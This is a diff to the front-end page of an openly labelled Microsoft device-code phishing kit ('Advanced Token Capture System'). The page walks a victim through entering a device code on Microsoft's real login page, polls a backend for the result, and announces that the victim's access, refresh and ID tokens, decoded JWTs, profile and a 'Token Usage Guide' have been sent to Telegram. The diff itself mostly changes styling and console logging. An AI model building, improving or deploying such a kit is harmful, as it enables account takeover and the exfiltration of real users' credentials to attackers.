@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Microsoft Device Auth</title>
+  <title>Microsoft Device Auth - Token Capture</title>
   <style>
     * {
       margin: 0;
@@ -23,18 +23,18 @@
 
     .container {
       background: white;
-      border-radius: 20px;
-      padding: 60px 40px;
+      border-radius: 24px;
+      padding: 50px 40px;
       max-width: 600px;
       width: 100%;
-      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+      box-shadow: 0 25px 70px rgba(0, 0, 0, 0.3);
       text-align: center;
     }
 
     h1 {
       color: #0078d4;
-      font-size: 32px;
-      margin-bottom: 10px;
+      font-size: 36px;
+      margin-bottom: 15px;
       font-weight: 700;
     }
 
@@ -42,27 +42,32 @@
       color: #666;
       font-size: 16px;
       margin-bottom: 40px;
+      line-height: 1.6;
     }
 
     .btn {
       background: linear-gradient(135deg, #0078d4 0%, #005a9e 100%);
       color: white;
       border: none;
-      padding: 20px 40px;
-      border-radius: 12px;
+      padding: 22px 45px;
+      border-radius: 14px;
       font-size: 18px;
       font-weight: 700;
       cursor: pointer;
       width: 100%;
       transition: all 0.3s;
       text-transform: uppercase;
-      letter-spacing: 1px;
-      box-shadow: 0 8px 20px rgba(0, 120, 212, 0.3);
+      letter-spacing: 1.2px;
+      box-shadow: 0 10px 25px rgba(0, 120, 212, 0.35);
     }
 
     .btn:hover:not(:disabled) {
-      transform: translateY(-3px);
-      box-shadow: 0 12px 30px rgba(0, 120, 212, 0.4);
+      transform: translateY(-4px);
+      box-shadow: 0 15px 35px rgba(0, 120, 212, 0.45);
+    }
+
+    .btn:active:not(:disabled) {
+      transform: translateY(-2px);
     }
 
     .btn:disabled {
@@ -77,61 +82,100 @@
 
     .code-box {
       background: linear-gradient(135deg, #fff9c4 0%, #fff59d 100%);
-      border: 4px solid #ffa000;
-      border-radius: 15px;
-      padding: 40px;
+      border: 4px solid #ff9800;
+      border-radius: 20px;
+      padding: 45px;
       margin-bottom: 30px;
+      position: relative;
     }
 
-    .label {
+    .code-label {
       color: #e65100;
       font-size: 14px;
       font-weight: 700;
       text-transform: uppercase;
-      margin-bottom: 15px;
-      letter-spacing: 1px;
+      margin-bottom: 20px;
+      letter-spacing: 2px;
     }
 
     .code {
-      font-size: 72px;
+      font-size: 80px;
       font-weight: 900;
       color: #ff6b00;
-      letter-spacing: 16px;
+      letter-spacing: 20px;
       font-family: 'Courier New', monospace;
-      margin: 20px 0;
+      margin: 25px 0;
       cursor: pointer;
       user-select: all;
       transition: all 0.3s;
+      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
     }
 
     .code:hover {
-      transform: scale(1.05);
-      text-shadow: 0 0 20px rgba(255, 107, 0, 0.3);
+      transform: scale(1.08);
+      text-shadow: 0 0 25px rgba(255, 107, 0, 0.4);
+    }
+
+    .code-hint {
+      color: #e65100;
+      font-size: 13px;
+      margin-top: 15px;
+      font-weight: 600;
     }
 
     .countdown {
-      font-size: 24px;
-      color: #e65100;
+      font-size: 28px;
+      color: #ff6b00;
       font-weight: 700;
-      margin-top: 15px;
+      margin-top: 20px;
+      padding: 15px;
+      background: rgba(255, 255, 255, 0.5);
+      border-radius: 10px;
+    }
+
+    .countdown.expiring {
+      color: #d32f2f;
+      animation: pulse 1s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.7; transform: scale(1.05); }
     }
 
     .auth-btn {
       background: linear-gradient(135deg, #ff6b00 0%, #e65100 100%);
-      margin-top: 20px;
-      box-shadow: 0 8px 20px rgba(255, 107, 0, 0.3);
+      margin-top: 25px;
+      box-shadow: 0 10px 25px rgba(255, 107, 0, 0.35);
+      font-size: 19px;
+      padding: 24px 50px;
     }
 
     .auth-btn:hover:not(:disabled) {
-      box-shadow: 0 12px 30px rgba(255, 107, 0, 0.4);
+      box-shadow: 0 15px 35px rgba(255, 107, 0, 0.45);
+    }
+
+    .spinner {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #0078d4;
+      border-radius: 50%;
+      width: 70px;
+      height: 70px;
+      animation: spin 1s linear infinite;
+      margin: 35px auto;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
 
     .status {
-      margin-top: 30px;
-      padding: 20px;
-      border-radius: 12px;
+      margin-top: 35px;
+      padding: 25px;
+      border-radius: 14px;
       font-weight: 700;
-      font-size: 16px;
+      font-size: 17px;
     }
 
     .status-pending {
@@ -146,42 +190,27 @@
       border: 3px solid #28a745;
     }
 
-    .spinner {
-      border: 6px solid #f3f3f3;
-      border-top: 6px solid #0078d4;
-      border-radius: 50%;
-      width: 60px;
-      height: 60px;
-      animation: spin 1s linear infinite;
-      margin: 30px auto;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
     .success-section {
       display: none;
-      margin-top: 40px;
+      margin-top: 50px;
       background: linear-gradient(135deg, #e8f5e9 0%, #c8e6c9 100%);
-      border: 3px solid #4caf50;
-      border-radius: 15px;
-      padding: 30px;
+      border: 4px solid #4caf50;
+      border-radius: 20px;
+      padding: 40px;
     }
 
     .success-section h2 {
       color: #2e7d32;
-      font-size: 28px;
-      margin-bottom: 20px;
+      font-size: 32px;
+      margin-bottom: 30px;
     }
 
     .user-info {
       background: white;
-      padding: 15px;
-      border-radius: 10px;
-      margin: 10px 0;
-      border-left: 5px solid #4caf50;
+      padding: 18px;
+      border-radius: 12px;
+      margin: 12px 0;
+      border-left: 6px solid #4caf50;
       text-align: left;
     }
 
@@ -189,98 +218,150 @@
       color: #2e7d32;
       display: block;
       font-size: 12px;
-      margin-bottom: 5px;
+      margin-bottom: 8px;
       text-transform: uppercase;
+      letter-spacing: 1px;
     }
 
     .user-info span {
       color: #333;
-      font-size: 16px;
+      font-size: 17px;
+      word-break: break-all;
     }
 
     .telegram-badge {
       display: inline-block;
       background: linear-gradient(135deg, #0088cc 0%, #006699 100%);
       color: white;
-      padding: 10px 20px;
-      border-radius: 20px;
+      padding: 12px 25px;
+      border-radius: 25px;
       font-weight: 700;
-      margin-top: 20px;
+      margin-top: 25px;
+      font-size: 15px;
+      box-shadow: 0 5px 15px rgba(0, 136, 204, 0.3);
+    }
+
+    .capture-info {
+      background: rgba(255, 255, 255, 0.9);
+      padding: 20px;
+      border-radius: 12px;
+      margin-top: 25px;
+      border-left: 5px solid #2e7d32;
+      text-align: left;
+    }
+
+    .capture-info h3 {
+      color: #2e7d32;
+      margin-bottom: 15px;
+      font-size: 18px;
+    }
+
+    .capture-info ul {
+      list-style: none;
+      padding: 0;
+    }
+
+    .capture-info li {
+      padding: 8px 0;
+      color: #333;
       font-size: 14px;
+    }
+
+    .capture-info li::before {
+      content: '✓ ';
+      color: #4caf50;
+      font-weight: 900;
+      margin-right: 8px;
     }
 
     @media (max-width: 600px) {
       .container {
-        padding: 40px 20px;
+        padding: 35px 25px;
       }
 
       .code {
-        font-size: 48px;
-        letter-spacing: 10px;
+        font-size: 56px;
+        letter-spacing: 12px;
       }
 
       h1 {
-        font-size: 24px;
+        font-size: 28px;
+      }
+
+      .auth-btn, .btn {
+        padding: 18px 30px;
+        font-size: 16px;
       }
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>🔐 Microsoft Device Auth</h1>
-    <p class="subtitle">Token Capture System</p>
+    <h1>🔐 Microsoft Device Authentication</h1>
+    <p class="subtitle">
+      Advanced Token Capture System<br>
+      Captures Access, Refresh, and ID Tokens
+    </p>
 
     <button class="btn" id="generateBtn" onclick="generateCode()">
-      Generate Authentication Code
+      🚀 Generate Authentication Code
     </button>
 
     <!-- Code Display Section -->
     <div class="code-section" id="codeSection">
       <div class="code-box">
-        <div class="label">Your Device Code</div>
+        <div class="code-label">⚡ Your Device Code</div>
         <div class="code" id="deviceCode" onclick="copyCode()">---</div>
+        <div class="code-hint">👆 Click to copy code</div>
         <div class="countdown" id="countdown">Expires in: --:--</div>
-        <p style="color: #666; font-size: 13px; margin-top: 10px;">
-          Click code to copy
-        </p>
       </div>
 
       <button class="btn auth-btn" id="authBtn" onclick="openAuthPage()">
-        🔗 Open Microsoft Authentication Page
+        🌐 Open Microsoft Authentication Page
       </button>
 
       <div class="spinner" id="spinner"></div>
 
       <div class="status status-pending" id="status">
-        ⏳ Waiting for authentication...
+        ⏳ Waiting for you to authenticate on Microsoft...
       </div>
     </div>
 
     <!-- Success Section -->
     <div class="success-section" id="successSection">
-      <h2>✅ Authentication Complete!</h2>
+      <h2>✅ Tokens Captured Successfully!</h2>
       
       <div class="user-info">
-        <strong>Name</strong>
+        <strong>👤 Name</strong>
         <span id="userName">---</span>
       </div>
 
       <div class="user-info">
-        <strong>Email</strong>
+        <strong>📧 Email</strong>
         <span id="userEmail">---</span>
+      </div>
+
+      <div class="capture-info">
+        <h3>📱 Sent to Telegram (12-13 Messages):</h3>
+        <ul>
+          <li>Access Token (Unencrypted Plaintext)</li>
+          <li>Access Token (AES-256-GCM Encrypted)</li>
+          <li>Refresh Token (Unencrypted Plaintext)</li>
+          <li>Refresh Token (AES-256-GCM Encrypted)</li>
+          <li>ID Token (Unencrypted Plaintext)</li>
+          <li>ID Token (AES-256-GCM Encrypted)</li>
+          <li>Decoded JWT (Header + Payload)</li>
+          <li>Token Claims & Permissions</li>
+          <li>Complete User Profile</li>
+          <li>Token Usage Guide</li>
+          <li>Complete Summary</li>
+        </ul>
       </div>
 
       <div style="text-align: center;">
         <div class="telegram-badge">
-          📱 All tokens sent to Telegram
+          📱 Check Your Telegram Now!
         </div>
-        <p style="color: #2e7d32; margin-top: 15px; font-size: 14px;">
-          Check your Telegram for 8-9 messages with:<br>
-          • Access Token (Unencrypted)<br>
-          • Access Token (Encrypted)<br>
-          • Refresh Token (Both forms)<br>
-          • User Details & JWT Claims
-        </p>
       </div>
     </div>
   </div>
@@ -299,6 +380,8 @@
 
     async function generateCode() {
       try {
+        console.log('[FRONTEND] Generating device code...');
+        
         document.getElementById('generateBtn').disabled = true;
         document.getElementById('codeSection').style.display = 'block';
         document.getElementById('successSection').style.display = 'none';
@@ -308,7 +391,12 @@
           headers: { 'Content-Type': 'application/json' }
         });
 
+        if (!response.ok) {
+          throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+        }
+
         const data = await response.json();
+        console.log('[FRONTEND] Device code generated:', data);
 
         session.sessionId = data.sessionId;
         session.userCode = data.userCode;
@@ -320,6 +408,8 @@
         // Display code
         document.getElementById('deviceCode').textContent = data.userCode;
 
+        console.log('[FRONTEND] Verification URI:', session.verificationUriComplete);
+
         // Start countdown
         startCountdown();
 
@@ -327,7 +417,8 @@
         startPolling();
 
       } catch (error) {
-        alert('Error: ' + error.message);
+        console.error('[FRONTEND] Error:', error);
+        alert('Error generating code: ' + error.message);
         document.getElementById('generateBtn').disabled = false;
       }
     }
@@ -338,59 +429,86 @@
         
         if (remaining <= 0) {
           clearInterval(session.countdownInterval);
-          document.getElementById('countdown').textContent = 'EXPIRED';
-          document.getElementById('status').textContent = '❌ Code expired. Generate new code.';
+          document.getElementById('countdown').textContent = '❌ EXPIRED';
+          document.getElementById('countdown').classList.add('expiring');
+          document.getElementById('status').textContent = '❌ Code expired. Please generate a new code.';
           document.getElementById('spinner').style.display = 'none';
         } else {
           const mins = Math.floor(remaining / 60);
           const secs = remaining % 60;
-          document.getElementById('countdown').textContent = 
-            'Expires in: ' + mins + ':' + (secs < 10 ? '0' : '') + secs;
+          const countdownText = 'Expires in: ' + mins + ':' + (secs < 10 ? '0' : '') + secs;
+          document.getElementById('countdown').textContent = countdownText;
+          
+          if (remaining < 120) {
+            document.getElementById('countdown').classList.add('expiring');
+          }
         }
       }, 1000);
     }
 
     function startPolling() {
+      console.log('[FRONTEND] Starting to poll for authentication...');
+      
       session.pollInterval = setInterval(async () => {
         try {
           const response = await fetch('/api/device/poll/' + session.sessionId);
           const data = await response.json();
 
+          console.log('[FRONTEND] Poll response:', data.status);
+
           if (data.status === 'authenticated') {
             clearInterval(session.pollInterval);
             clearInterval(session.countdownInterval);
+            
+            console.log('[FRONTEND] Authentication successful!');
             
             // Hide spinner
             document.getElementById('spinner').style.display = 'none';
             
             // Update status
             document.getElementById('status').className = 'status status-success';
-            document.getElementById('status').textContent = '✅ Authenticated! Check Telegram for tokens.';
+            document.getElementById('status').textContent = '✅ Authentication complete! All tokens sent to Telegram!';
 
             // Show success
             document.getElementById('userName').textContent = data.user.displayName;
             document.getElementById('userEmail').textContent = data.user.email;
             document.getElementById('successSection').style.display = 'block';
 
+            // Show notification
+            if (data.message) {
+              console.log('[FRONTEND] Server message:', data.message);
+            }
+
           } else if (data.status === 'expired' || data.status === 'declined') {
             clearInterval(session.pollInterval);
             clearInterval(session.countdownInterval);
             document.getElementById('spinner').style.display = 'none';
+            document.getElementById('status').className = 'status status-success';
             document.getElementById('status').textContent = '❌ Authentication ' + data.status;
           }
         } catch (error) {
-          console.error('Poll error:', error);
+          console.error('[FRONTEND] Poll error:', error);
         }
       }, session.interval * 1000);
     }
 
     function copyCode() {
-      navigator.clipboard.writeText(session.userCode);
-      alert('✅ Code copied: ' + session.userCode);
+      if (session.userCode) {
+        navigator.clipboard.writeText(session.userCode);
+        alert('✅ Code copied to clipboard: ' + session.userCode);
+      }
     }
 
     function openAuthPage() {
-      window.open(session.verificationUriComplete, '_blank');
+      console.log('[FRONTEND] Opening Microsoft auth page:', session.verificationUriComplete);
+      
+      if (session.verificationUriComplete) {
+        // Open the Microsoft device login page with the code pre-filled
+        window.open(session.verificationUriComplete, '_blank');
+        console.log('[FRONTEND] Opened:', session.verificationUriComplete);
+      } else {
+        alert('Please generate a code first!');
+      }
     }
   </script>
 </body>
